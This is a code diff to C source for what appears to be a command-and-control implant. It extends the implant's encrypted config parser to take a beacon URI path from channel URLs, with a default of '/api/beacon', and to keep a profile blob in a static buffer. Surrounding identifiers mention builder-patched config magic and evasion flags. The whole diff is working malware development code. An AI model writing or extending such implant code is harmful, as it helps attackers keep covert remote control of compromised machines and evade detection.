@@ -19,6 +19,11 @@
 
 static IMPLANT_CONFIG g_config;
 
+/* Static buffer for profile blob — copied from decrypted config to survive
+ * stack frame reuse (the decrypted buffer in cfg_init is on the stack). */
+#define MAX_PROFILE_BLOB 4096
+static BYTE g_profile_blob_buf[MAX_PROFILE_BLOB];
+
 /* ================================================================== */
 /*  Per-build config magic — patchable by builder                      */
 /* ================================================================== */
@@ -352,8 +357,10 @@ static NTSTATUS cfg_patch_tlv(IMPLANT_CONFIG *cfg, const BYTE *data, DWORD len) 
                 spec_memcpy(cfg->channels[idx].url, s, copy);
                 cfg->channels[idx].url[copy] = 0;
 
-                /* Extract port if explicit, otherwise use default */
+                /* Extract port if explicit, otherwise use default.
+                   Also extract URI path after host:port. */
                 DWORD port = default_port;
+                DWORD path_start = hlen; /* where the path begins */
                 if (hlen < slen && s[hlen] == ':') {
                     DWORD pstart = hlen + 1;
                     port = 0;
@@ -362,8 +369,31 @@ static NTSTATUS cfg_patch_tlv(IMPLANT_CONFIG *cfg, const BYTE *data, DWORD len) 
                         pstart++;
                     }
                     if (port == 0) port = default_port;
+                    path_start = pstart;
                 }
                 cfg->channels[idx].port = port;
+
+                /* Extract URI path (everything from '/' onwards) */
+                if (path_start < slen && s[path_start] == '/') {
+                    DWORD plen = slen - path_start;
+                    DWORD pcopy = plen < 255 ? plen : 255;
+                    spec_memcpy(cfg->channels[idx].uri, s + path_start, pcopy);
+                    cfg->channels[idx].uri[pcopy] = 0;
+                } else {
+                    /* No path — default to /api/beacon for backward compat */
+                    cfg->channels[idx].uri[0] = '/';
+                    cfg->channels[idx].uri[1] = 'a';
+                    cfg->channels[idx].uri[2] = 'p';
+                    cfg->channels[idx].uri[3] = 'i';
+                    cfg->channels[idx].uri[4] = '/';
+                    cfg->channels[idx].uri[5] = 'b';
+                    cfg->channels[idx].uri[6] = 'e';
+                    cfg->channels[idx].uri[7] = 'a';
+                    cfg->channels[idx].uri[8] = 'c';
+                    cfg->channels[idx].uri[9] = 'o';
+                    cfg->channels[idx].uri[10] = 'n';
+                    cfg->channels[idx].uri[11] = 0;
+                }
 
                 cfg->channel_count = idx + 1;
             }
@@ -401,8 +431,13 @@ static NTSTATUS cfg_patch_tlv(IMPLANT_CONFIG *cfg, const BYTE *data, DWORD len) 
         }
 
         case CFG_TLV_PROFILE_BLOB:
-            /* Profile blob stored separately — attach to comms later */
-            cfg->profile_id = vlen; /* Stash blob length; actual parsing deferred */
+            /* Copy profile blob to persistent static buffer (val points into
+             * the decrypted config buffer which is stack-local in cfg_init). */
+            if (vlen <= MAX_PROFILE_BLOB) {
+                spec_memcpy(g_profile_blob_buf, val, vlen);
+                cfg->profile_blob = g_profile_blob_buf;
+                cfg->profile_blob_len = vlen;
+            }
             break;
 
         case CFG_TLV_EVASION_FLAGS:
